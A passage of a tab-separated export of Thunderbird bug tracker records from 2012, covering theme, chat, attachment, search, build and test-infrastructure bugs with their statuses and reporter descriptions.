enabled at this time and should be skipped in this scenario.
735286%TAB%1331628449%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Missing chat inverse icon%TAB%Missing chat inverse iconWhen move chat button near search icon (or if installed also calendar and task icon), TB display an empty square
735282%TAB%1331628027%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Missing border in activity manager window%TAB%Missing border in activity manager windowThe activity manager window is missing a border around the content under Aero. This is strange, Firefox has the same rules for downloadManager and it works but with ActivityManager it doesn't work. Normally -moz-appearance: -moz-win-glass should give a Aero window with border around the non-transparent parts but here it doesn't. Also adding -moz-appearance: -moz-win-exclude-glass; for .activityview doesn't work.  My patch adds a half-transparent border around the .activityview like we have around the main window.  It's not the best solution, but I see no other except making the window non-Aero.
735240%TAB%1331621257%TAB%273994%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Bigfiles: Failures when account creation is cancelled,Filelink: Failures when account creation is cancelled%TAB%Bigfiles: Failures when account creation is cancelled,Filelink: Failures when account creation is cancelledSTR  on today's Trunk  1 compose 2 add big attachment 3 [review] without any bigfiles accounts defined, click "Link" from bigfiles alert 4 don't proceed with bigfiles account creation (I watched the dropbox video and then somehow exited) 5 context menu from big attachment > convert to > 6 click on blank menu item  actual result  after 5:  "context menu > convert to" has this (confusing, something wrong here):  o regular attachment ---------------------- [blank menu item]  after 6:  clicking on blank menu item attempts conversion into linked attachment, which subsequently fails miserably in all sorts of ways: - confusing messages of application trying to connect to dropbox or something - after exiting from that message (still without creating or having any bigfiles account): - spinner on big attachments keeps turning forever, pretends to be "uploading" (while I don't have anything to upload to) - convert to is disabled - cannot send the message (send disabled) - creating a new message with same attachment no longer shows the bigfiles alert  Expected result  Pls ensure that after cancellation of bigfiles account creation, the context menu is behaving better, and that user can't get into undefined attachment states (I'll leave the details to you)
735219%TAB%1331618828%TAB%360522%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Cannot login to twitter with Instant messaging%TAB%Cannot login to twitter with Instant messagingEnviroment: *Windows 7 (x64) *http://hg.mozilla.org/mozilla-central/rev/1ca7a94573f2  STR: 1. Open "Add chat account". 2. Select Twitter and add Twitter account.  Result: I cannot login to Twitter. The status on the "Instant messaging status" window holds as "Connection: Initiating...".  If I reconnect it after I disconnected once,  The following error occurs:  Error: uncaught exception: [Exception... "Component returned failure code: 0x80070057 (NS_ERROR_ILLEGAL_VALUE) [nsIXMLHttpRequest.open]"  nsresult: "0x80070057 (NS_ERROR_ILLEGAL_VALUE)"  location: "JS frame :: resource:///modules/http.jsm :: doXHRequest :: line 13"  data: no]
735217%TAB%1331618201%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Status icons styled incorrectly%TAB%Status icons styled incorrectlyThere are two places that we still display wrongly styled status icons (from the shared resource rather than from the individual platform theme)  1. Tools > Chat status > Unavailable 2. The icons in the Tools > Chat status > Show accounts dialog.  As a bonus, I broke out some ifdef's in imAccounts.css Only tested on Windows so far.
735215%TAB%1331617797%TAB%325572%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Generic Jabber should be enabled,Enable generic XMPP protocol,Enable Jabber / generic XMPP protocol%TAB%Generic Jabber should be enabled,Enable generic XMPP protocol,Enable Jabber / generic XMPP protocolAfter a discussion with Florian it appears that generic Jabber support is disabled because of the lack of support for DNS SRV (see bug 14328).  While it might makes sense on InstantBird since libpurple does provides SRV support and XMPP-JS doesn't, meaning it would be a regression, I don't think TB should wait for SRV support to enable generic Jabber.  Almost every public Jabber servers runs on port 5222.
735108%TAB%1331566897%TAB%396948%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Thick black border around tabs%TAB%Thick black border around tabsMozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:12.0a2) Gecko/20120312 Thunderbird/12.0a2  After a recent update the tabs have all had a thick black border. See attached screenshot.
734734%TAB%1331437845%TAB%319067%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%build failure at thunderbird.mdimporter on case-sensitive filesystem%TAB%build failure at thunderbird.mdimporter on case-sensitive filesystembuilding the xcode project fails on a case-sensitive filesystem due to  thunderbird and Thunderbird may different files.
734688%TAB%1331391091%TAB%91159%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%OpenSearch broke session history for content tabs%TAB%OpenSearch broke session history for content tabsSince Firefox 10 I've been seeing session history broken for content tabs created by my extension WebApp Tabs. I finally figured out the problem today, the browser elements created by specialTabs.js end up with the disablehistory attribute set on them. I have a workaround but it looks to me like this is a mistake caused by the landing of bug 677421.  That patch is too big for me to want to spend anytime trying to figure out exactly what the expectation is of these things, but here are two anomalies I can see that are likely bugs:  The overlay attempts to modify the dummycontentbrowser that all content browsers are cloned from to enable history by setting the disablehistory attribute to false. The problem is that that won't work, if the disablehistory attribute exists at all then history is disabled no matter its value. http://hg.mozilla.org/comm-central/annotate/b438e21e3c6b/mail/base/content/webSearchTab.xul#l53  As far as I can tell this should be unnecessary anyway as the specialTabs code removes the disablehistory attribute on startup before any new content tabs are created (http://mxr.mozilla.org/comm-central/source/mail/base/content/specialTabs.js#500), this used to work fine but unfortunately bug 677421 also introduced a second element with the id "dummycontentbrowser" and it is this element that is now returned by getElementById("dummycontentbrowser") so it is that that gets its dummycontentbrowser attribute removed instead. http://hg.mozilla.org/comm-central/annotate/b438e21e3c6b/mail/base/content/webSearchTab.xul#l71  My best guess without really knowing what the rest of the OpenSearch code is up to is that renaming that new browser element to have a unique ID and removing the attempt to modify disablehistory from webSearchTab.xul should just make everything work.
734384%TAB%1331274459%TAB%403756%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%Trunk build fails, complaining with "nsMsgDBFolder.cpp:179:88: error: no matching function for call to ‘NS_RegisterStaticAtoms(const nsStaticAtom [21], unsigned int)’"%TAB%Trunk build fails, complaining with "nsMsgDBFolder.cpp:179:88: error: no matching function for call to ‘NS_RegisterStaticAtoms(const nsStaticAtom [21], unsigned int)’"Trunk builds are failing with:  /buildbot/linux-comm-central-build/build/mailnews/base/util/nsMsgDBFolder.cpp: In constructor ‘nsMsgDBFolder::nsMsgDBFolder()’: /buildbot/linux-comm-central-build/build/mailnews/base/util/nsMsgDBFolder.cpp:179:88: error: no matching function for call to ‘NS_RegisterStaticAtoms(const nsStaticAtom [21], unsigned int)’ NEXT ERROR make[6]: *** [nsMsgDBFolder.o] Error 1 make[6]: Leaving directory `/buildbot/linux-comm-central-build/build/objdir-tb/mailnews/base/util' NEXT ERROR make[5]: *** [util_libs] Error 2  I'm pretty sure Bug 696242 is the cause.
733802%TAB%1331108475%TAB%379511%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Various issues in webSearchProvider.js%TAB%Various issues in webSearchProvider.jsI'm trying to get the web search feature working in Ubuntu, and hit some issues with webSearchProvider.js.  - "Cu" isn't defined anywhere, which prevents the component from loading at all - The definition of NS_XPCOM_CURRENT_PROCESS_DIR  has a typo - The logic in appendFileKey() for checking if the location exists is reversed - The category stanza is incorrect in mailComponents.manifest, as nsDirectoryService::RegisterCategoryProviders() doesn't understand "service,@mozilla.org/mail/web-search-provider;1". This is specific to nsAppStartupNotifier, which handles the "app-startup" category. - getFiles() returns non-existant searchplugin directories for extensions (even packed extensions), which makes nsSearchService blow up  This doesn't affect mozilla.org builds, as the searchplugin location in the application directory is found by the default provider. In Ubuntu, we want to install the searchplugins in to distribution/searchplugins, which gives us the ability to have language packs provide localized plugins
733517%TAB%1331035589%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Update Bing search%TAB%Update Bing searchWhen we landed the search engines, we removed all the extra search parameters as we didn't know if we could use them. Bing has now given us some search parameters to use in their search engine definition. The attached patch updates the search to do that.
732379%TAB%1330660470%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%send window is roundish and lacks border at top%TAB%send window is roundish and lacks border at topOn nightly the compose window currently lacks a 1px line and is somewhat rounded (3.5px or so) at the top. We should probably make the background extend up to the top of the window so that the toolbar and menubar aren't glassy (like how the main window is now).
732144%TAB%1330602183%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Warning: reference to undefined property this.maxAddressesBeforeMore,Make caching of address nodes with maxAddressesBeforeMore work again,Make caching of message-header address nodes with maxAddressesBeforeMore work again%TAB%Warning: reference to undefined property this.maxAddressesBeforeMore,Make caching of address nodes with maxAddressesBeforeMore work again,Make caching of message-header address nodes with maxAddressesBeforeMore work againIs see this in current trunk: Warning: reference to undefined property this.maxAddressesBeforeMore Source File: chrome://messenger/content/mailWidgets.xml Line: 820  The code: // We want to keep around the first maxAddressesBeforeMore email // address nodes as well as any intervening comma nodes. var numItemsToPreserve = this.maxAddressesBeforeMore * 2 - 1; var numItemsInNode = aParentNode.childNodes.length;  This variable is defined nowhere. What should it be?
731932%TAB%1330554314%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Change attachment events in the composer to be window-local%TAB%Change attachment events in the composer to be window-localThe attachment events added in bug 708982 are too global and get sent to all compose windows, which causes strange behavior. We should probably use DOM events instead. There are a couple of options:  1) Create the events in MsgComposeCommands.js like they are now 2) Create the events in the XBL binding  3) Fire one event for each attachment added/removed 4) Fire one event for all attachments added/removed at once  I think I prefer (1) and (4) respectively. (1) because add/remove events don't make much sense in the reader, and (4) just because that's how it is now, and it reduces the number of events.  Another question is what node the events get fired on. I'm thinking the attachmentBucket for add/remove, and the individual <attachmentitem> for rename.  I'm open to suggestions for any of these.
731907%TAB%1330541217%TAB%366440%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%Canceling sending e-mail removes attached file from hard drive.%TAB%Canceling sending e-mail removes attached file from hard drive.User Agent: Mozilla/5.0 (X11; Linux i686; rv:13.0) Gecko/20120229 Firefox/13.0a1 Build ID: 20120229031108  Steps to reproduce:  Hi all.  I am using PCLinuxOS 2012.02 fully upgraded. I am using Thunderbird Daily 13.0 installed it this way:  http://andrzejl.no-ip.org:10101/wordpress/2012/02/09/testing-mozilla-thunderbird-aurora-earlybird-12-safely-on-pclinuxos-2011-x/  Don't mind that it says Aurora I am using Comm Central.  I have attached a .png (does not matter what file is used) file and I have added a recipient of the message. I clicked Send button but before it was sent I have recalled that I was suppose to send this file to two recipients instead of one so I have cancelled the sending process and added another recipient to the BCC field.   Actual results:  When trying to send e-mail I received this error:  "Sending of message failed. Unable to open the temporary file /path/to/the/file.png. Check your 'Temporary Directory' setting."  When investigating the error I have noticed one thing. The file .png that I have attached to the message was gone from the hard drive. Luckily I had backup of the file... So I copied backed up file to the folder again and repeated the steps (sending, canceling, sending again) and it happened yet again. I tried different files with different extensions. Makes no difference. If You cancel sending the message and the message contains attachment the attached file will get deleted from hard drive... Really nasty bug (a lot of people will learn the hard way to backup their files :D).   Expected results:  The file should remain untouched on the hard drive after sending message was canceled.
731889%TAB%1330535903%TAB%32503%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%variable event redeclares argument: let event = document.createEvent("Events");%TAB%variable event redeclares argument: let event = document.createEvent("Events");While testing the latest comm-central version (I pulled it a couple of days ago), I noticed this following entry in debug console:  Warning: variable event redeclares argument Source File: chrome://messenger/content/mailWidgets.xml Line: 399, Column: 12 Source Code:         let event = document.createEvent("Events");   The following is the snippet I got from mailWidgets.xml:      <handlers>       <handler event="click" button="0" clickcount="2"><![CDATA[         let event = document.createEvent("Events");         event.initEvent("command", true, true);         this.dispatchEvent(event);       ]]></handler>     </handlers>  I think the warning message should be suppressed by renaming the let variable one way or the other.  We have enough warning messages to clutter up debug console and any change that can decrease the clutter will be appreciated before next release.  I have no idea where this code comes from at the moment, though.
731590%TAB%1330495005%TAB%112088%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Search%TAB%Update search engine list for Thunderbird%TAB%Update search engine list for ThunderbirdThe product team have agreed a new search engine list as follows:  Bing (default) Yahoo Amazon AOL eBay Twitter Wikipedia
731532%TAB%1330475547%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Fix issues in test pilot validation%TAB%Fix issues in test pilot validationVarious issues were found in the AMO validation of the test pilot xpi - see attached files.  We need to fix these asap so we can start pushing out studies.
730803%TAB%1330321219%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Don't ship unnecessary files with test pilot%TAB%Don't ship unnecessary files with test pilot- bootstrap.js is something for working with jetpack, which we don't do yet. - content/debug.html is just debug, and we don't need it in the release version of the xpi.  These will help with passing AMO review until we get these files to a better standard.
730701%TAB%1330250602%TAB%29811%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Difficult to determine active tab.  Insufficient color contrast.%TAB%Difficult to determine active tab.  Insufficient color contrast.Difficult to determine active tab.  Insufficient color contrast.  This is on Vista using Vista Windows Classic Theme. Thunderbird 13, default theme.
730483%TAB%1330095323%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Remove dropped prefixes from comm-central%TAB%Remove dropped prefixes from comm-centralBug 693510 dropped the support of -moz-border-radius and -moz-box-shadow. Comm-central has still some of this properties.
730239%TAB%1330047865%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Account Manager%TAB%Account provisionner: String change%TAB%Account provisionner: String changeChange 'Want a new email account for Thunderbird ?' to 'Do you want a new email account ?'
730072%TAB%1329997342%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Quick Filter Toggle is gone (or doesn't move from tabbar toolbar) on upgrade to TB 11 with Enigmail and/or Lightning installed%TAB%Quick Filter Toggle is gone (or doesn't move from tabbar toolbar) on upgrade to TB 11 with Enigmail and/or Lightning installedBug 717264, which moves the Quick Filter Bar toggle from the tabbar-toolbar to mail-bar3, landed earlier this week, and we're getting sporadic reports that the toggle isn't moving OR is disappearing in some cases.  Chris might correct me here, but I think the steps to reproduce are as follows:  1)  In a recent TB 11, install Enigmail or Lightning in a new profile. 2)  Set mail.ui-rdf.version to 2, and shut down Thunderbird 3)  Replace the localstore.rdf for the new profile with the one attached to this bug 4)  Start up TB  What happens?  According to Chris Coulson, with Lightning installed the toggle stays where it is.  With Enigmail installed, the toggle disappears from the toolbars.  What's expected?  The QFB toggle should be in the mail toolbar (mail-bar3).  Reports for this have cropped up for both OSX and Linux, so I'll assume it affects all platforms.
730043%TAB%1329992541%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Checked QFB button should better work with Personas%TAB%Checked QFB button should better work with PersonasBug 728553 introduced a pressed state when checked. The button has then a fixed color which could make it bad readable on some Personas.
729197%TAB%1329817232%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Make Quickfilter bar toggle work for glodaList tabs%TAB%Make Quickfilter bar toggle work for glodaList tabsSteps to reproduce (assumes < TB 11, or patch for bug 728309 is applied, to show mail-bar3 in glodaList tabs)  1)  Type a search query into the Gloda search input 2)  In the results tab, click on one of the results  What happens?  The Quickfilter bar toggle is disabled  What is expected?  The Quickfilter bar toggle should be enabled
728964%TAB%1329747524%TAB%393285%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Widget: Cocoa,Mail Window Front End%TAB%Crash when 'About Thunderbird' is clicked,Crash [@ -[NativeMenuItemTarget menuItemHit:] ] when 'About Thunderbird' is clicked%TAB%Crash when 'About Thunderbird' is clicked,Crash [@ -[NativeMenuItemTarget menuItemHit:] ] when 'About Thunderbird' is clickedSteps to reproduce (for me at least): 1. Open Thunderbird 2. Close the Thunderbird window (but do not exit the program) 3. Open a new Thunderbird window (e.g., click on the dock icon) 4. Click on Thunderbird->About Thunderbird  At this point, one of two things happen: 1. The menu closes, but nothing else happens OR 2. Thunderbird crashes.  If #1 happens, the program has always crashed after I clicked About Thunderbird a second time.  Usually I will be asked to submit a crash report, but occasionally I will just get an OS error message saying Thunderbird closed unexpectedly.  I've included a link to me latest crash report in the URL field.  Maybe related, maybe a different bug: After closing the Thunderbird window (so no windows are open, but the program is still running), clicking About Thunderbird closes the menu, but otherwise does absolutely nothing.
728936%TAB%1329736305%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Drop jquery*.min.js from test pilot%TAB%Drop jquery*.min.js from test pilotDoing a few searches on the code for Test Pilot shows that we don't actually need the *.min.js files. These actually come from the shipped version of the "flot" extension to jquery which includes both the min and non-min files, so we should really just package the ones we need.
728897%TAB%1329723393%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%"Search All Messages" should be just "Search"%TAB%"Search All Messages" should be just "Search"In the Global Search bar, "Search All Messages" should just be "Search" now that we have the capability to do web search in there, and new features may add search for other things to that list.
728810%TAB%1329696705%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Port bug 553092 - Initialise the permissions manager only on startup%TAB%Port bug 553092 - Initialise the permissions manager only on startupBug 553092 did some work to improve initialisation of the permissions manager on startup.  We should port that to Thunderbird - we basically need to port the browser.js part (to LightWeightThemeWebInstaller in msgMail3PaneWindow.js) and the permissions.js part to the like file in Thunderbird.
728553%TAB%1329540383%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Toolbars and Tabs%TAB%Better styling for checked QFB button on mail-toolbox under OS X%TAB%Better styling for checked QFB button on mail-toolbox under OS XThe checked QFB button on mail-toolbox looks weird because the background is filled with #DDDDDD. Andreas proposed on IRC to use the styling of the Quick-filter-bar buttons.
728493%TAB%1329494185%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Add Lion window opening animation (zoom on creation) to Thunderbird%TAB%Add Lion window opening animation (zoom on creation) to ThunderbirdThis patch will add the window animation in Lion to the standalone window, the main window, the addressbook and the compose window.
728385%TAB%1329480765%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%OS Integration%TAB%[10.8] Include support for Mountain Lions "Notification Center" into Thunderbird%TAB%[10.8] Include support for Mountain Lions "Notification Center" into ThunderbirdOS X 10.8 has a new service "Notification center", which is a bit similar to Growl. Would be nice if we include support for this into Thunderbird for new mails, for the instant messaging feature, for news (and what else).
728309%TAB%1329471736%TAB%403756%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs%TAB%Re-enable mail toolbar in Message tab,Re-enable mail toolbar in message tab and Gloda search result list%TAB%Re-enable mail toolbar in Message tab,Re-enable mail toolbar in message tab and Gloda search result listWe'd like to re-enable the below-tabs mail toolbar for the message pane and for the Gloda search result list.
728101%TAB%1329412340%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Global search box shrinks when selected%TAB%Global search box shrinks when selectedNoticed that the search box in trunk shrinks a couple of pixels when selected. This is because in unselected state the text is italic (and wider) and when selected normal. This can be solved by giving a fixed width to the search box, removing the italic (like in Bug 636014) or exchange the flexible spacer with fixed spacer. I'm on XP now and can't test if the last really would solve the problem.
728094%TAB%1329409167%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Splitter is very fat in wide view%TAB%Splitter is very fat in wide viewSetting this to minor, as wide view is not our default. There seems to be a very fat line at the top of the message header in Wide View.  To reproduce: * Go to View > Layout > Wide View * Yep, there it is.
727851%TAB%1329377809%TAB%97012%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Use getSpecialFolderString() in folderWidgets.xml._setCssSelectors%TAB%Use getSpecialFolderString() in folderWidgets.xml._setCssSelectorsNoticed in bug 670976 comment 26.  There is duplicated code in folderWidgets.xml._setCssSelectors, which is already defined in /mailnews/base/util/folderUtils.jsm getSpecialFolderString().
727818%TAB%1329371263%TAB%293419%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%reloading full group list every time%TAB%reloading full group list every timeUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Build ID: 20120208060813  Steps to reproduce:  click the "New groups" in TB's subscribe window.   Actual results:  TB begin reloading the full group list. I checked the server log and find TB just issue "List" command to news server when click the "New groups" tab.    Expected results:  TB should check new groups only and issue "newgroups" command, IIRC.
727689%TAB%1329328054%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Clean up borders for attachment lists%TAB%Clean up borders for attachment listsThe borders on the attachment lists in the reader and composer are a bit ugly looking. We should fix this. Here's a patch, since I'm sick of looking at the ugliness every day. :)  I also made the total attachment size line up with each attachment's size in the composer.
727598%TAB%1329309713%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Create icons for new Next and Previous message buttons created in bug 235666%TAB%Create icons for new Next and Previous message buttons created in bug 235666This is a followup bug to bug 235666, where new buttons for Next (read) and Previous (read) message buttons were implemented. But they reuse the existing icons used for Next/Previous (Unread) message.  So new icons should be created to differentiate the functions, as the button labels are intentionally identical.  Currently thre next/previous icons contain 2 blue arrows (at least in gnomestripe theme). Maybe the same design with 1 arrow could be drawn.  This bug needs somebody who knows to create those icons and land them into the theme files (mail-toolbar.png and mail-toolbar-small.png).  After that I can make the necessary css updates in the theme to make the buttons use the new icons.
727571%TAB%1329305202%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-lwthemes.js | test-lwthemes.js::test_lightweight_themes%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-lwthemes.js | test-lwthemes.js::test_lightweight_themesThis one just popped up on Windows, and a few times on Linux too.  SUMMARY-UNEXPECTED-FAIL | e:\buildbot\comm-central-win32-opt-unittest-mozmill\build\mozmill\content-tabs\test-lwthemes.js | test-lwthemes.js::test_lightweight_themes   EXCEPTION: No lightweight theme installed after selecting undo     at: test-lwthemes.js line 127        install_theme(2,1) test-lwthemes.js 127        test_lightweight_themes() test-lwthemes.js 171             frame.js 557             frame.js 626             frame.js 669             frame.js 497             frame.js 675             server.js 179             server.js 183
727154%TAB%1329212766%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL |test-message-filters.js | test-message-filters.js::test_address_books_appear_in_message_filter_dropdown%TAB%Permanent orange: TEST-UNEXPECTED-FAIL |test-message-filters.js | test-message-filters.js::test_address_books_appear_in_message_filter_dropdownThis has shown up on comm-central recently:  SUMMARY-UNEXPECTED-FAIL | test-message-filters.js | test-message-filters.js::test_address_books_appear_in_message_filter_dropdown   EXCEPTION: Did not display the correct number of address books in the filter menu list.: '2' != '0'.     at: test-folder-display-helpers.js line 2842        assert_true(false,"Did not display the correct number of address books in the filter menu list.: '2' != '0'.") test-folder-display-helpers.js 2842        assert_equals(2,0,"Did not display the correct number of address books in the filter menu list.") test-folder-display-helpers.js 2829        filterEditorOpened([object Object]) test-message-filters.js 230             frame.js 552        WindowWatcher_notify([object XPCWrappedNative_NoHelper]) test-window-helpers.js 365  I believe this is fallout from bug 722187
726942%TAB%1329180063%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Drop redundant general.useragent.extra.thunderbird preference%TAB%Drop redundant general.useragent.extra.thunderbird preferenceBug 581008 removed support for the general.useragent.extra.* strings way back in Gecko 2.  We should get around to doing the same as it simplifies our makefiles and preferences a little amount.
726344%TAB%1328959939%TAB%26835%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Reader UI%TAB%add tooltiptext to more (addresses) indicator in the header pane%TAB%add tooltiptext to more (addresses) indicator in the header paneAdd a tooltiptext to the more (addresses) indicator in the header pane for the to, cc bcc fields. See the attached screenshot of the implementation for the two line compact header view if the CompactHeader addon is installed (version 2.0.2beta2).  The addon version includes all addresses in the tooltip text. It might make more sense to only show the hidden addresses (but it's harder to implement in the addon).  Any interest to add this feature to Thunderbird core?
726301%TAB%1328941233%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%SummaryFrameManager logic is wrong%TAB%SummaryFrameManager logic is wrongSo I was hunting down the following bug. Happens only on Thunderbird 11 and later, since the SummaryFrameManager landed in Thunderbird 11.  - Install Conversations (http://jonathan.xulforum.org/files/gcv-nightlies/, just grab the latest file) and Mail Summaries (latest version on AMO). - View a message in the conversation view. - Click the "Delete" button in the conversation toolbar (rightmost button). - The conversation view is in a bad state (unable to recover unless you switch folders or select multiple messages) and the folder summary is in a bad state too.  I hunted it down to the following line: if I add a dump statement like so in summaryFrameManager.js:87        this.iframe.contentDocument.location.href = aUrl;       dump("--- -> now is "+this.iframe.contentDocument.location.href+" "+aUrl+"\n");  Then the code dumps:  --- -> now is chrome://conversations/content/stub.xhtml chrome://mailsummaries/content/folderSummary.xhtml  That is to say, right after we set the .href to "folderSummary.xhtml", its value still is "stub.xhtml". What happens next is the conversation view kicks back in to grab the multimessage. Because the old "stub.xhtml" value is still held in ".href", the FrameManager thinks everything is fine, and instructs the conversation view to proceed (because the document currently loaded is the right one). Next thing we know, loading folderSummary.xhtml *actually* happens, but: - the folderSummary callback was cancelled by the conversation view's - the conversation view's callback fails miserably because, of course, the loaded document is not the right one.  I'm really puzzled, and I'm unsure what we should do at that stage
723908%TAB%1328245981%TAB%379511%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Dark toolbars use wrong text colour on Linux%TAB%Dark toolbars use wrong text colour on LinuxDesign have changed our dark theme in Ubuntu to have light coloured menu popups with dark text (rather than dark popups with light text, like we had previously). Unfortunately, this exposes a bug in the Thunderbird theme, which styles the tabs in the main window and the toolbars in the compose / addressbook windows with the background of the menubar (which is dark), and the text colour of the menu popups (which used to be light, but is now dark).  It seems that Thunderbird should be using -moz-menubartext rather than MenuText in these cases (Firefox seems to do this already, so it didn't break with our theme change)
723863%TAB%1328233234%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Standalone Message window toolbar doesn't show personas%TAB%Standalone Message window toolbar doesn't show personasThe toolbar of the standalone message window isn't showing the personas background. On the mac it just has a grey background.  The titlebar does show personas, so this looks a little strange.
723583%TAB%1328171988%TAB%428302%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Test Pilot,General%TAB%test pilot thunderbird 'all your user studies' shows each more than once%TAB%test pilot thunderbird 'all your user studies' shows each more than onceTo reproduce:  1.  studies in ``https://testpilot.mozillalabs.com/testcases/index-tb-dev.json`` 2.  tbird with test pilot 1.2:  Preferences > advanced > config editor:        extensions.testpilot.indexFileName -> index-tb-dev.json  3.  (clear the cached download - OSX)...       $ rm ~/Library/Thunderbird/Profiles/*.default//TestPilotExperimentFiles/index.json  4.  Restart Tbird. 5.  GOOD - doorhanger appears about new study 6.  BAD - ``tools > test pilot > all your user studies > [current]``      (studies show up multiple times)  To investigate...  Starting with ``https://github.com/mozsquib/testpilot.git``, going to look for issues in ``setup.js``
723317%TAB%1328105567%TAB%141755%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installer%TAB%Update MinSupportedVer string for bug 668574%TAB%Update MinSupportedVer string for bug 668574Spinoff of bug 668574 for Thunderbird where we will no longer support Win XP SP1 and below. Bug 668574 will likely be landing on today (February 2nd). Since Thunderbird uses the same common code as Firefox it will also pick up the change and the Thunderbird installer will refuse to install on Win2K.
723112%TAB%1328078533%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%attachment reminder bar is too tall%TAB%attachment reminder bar is too tallDiscovered during Bigfiles testing that the attachment reminder bar on the Mac is a bit too tall. This is mainly due to the big icon we're using there. This also affects the bar where bigfiles asks you if you want to convert the file.
722798%TAB%1328005496%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%test_offlinePlayback.js failing on windows tinderbox%TAB%test_offlinePlayback.js failing on windows tinderboxpatch upcoming - not sure why the old do_timeout_function was failing, but we might as well use do_timeout anyway.
722687%TAB%1327988557%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Restart message looks unstyled%TAB%Restart message looks unstyledWhen installing an addon, the message we're displaying for restarting Thunderbird doesn't look good. It is gray and looks unstyled. This is probably quite easy to fix.  Another option is to have a very nice restart message like Firefox does, but that probably requires some more hacking.
722355%TAB%1327911909%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%[TB] On about:support, "Profile Directory" should be "Profile Folder"%TAB%[TB] On about:support, "Profile Directory" should be "Profile Folder"+++ This bug was initially created as a clone of Bug #559501 +++  Windows and Mac both use the term "folder" in preference to the term "directory". This is Thunderbird version of bug 559501. It just picks up strings added in Toolkit.
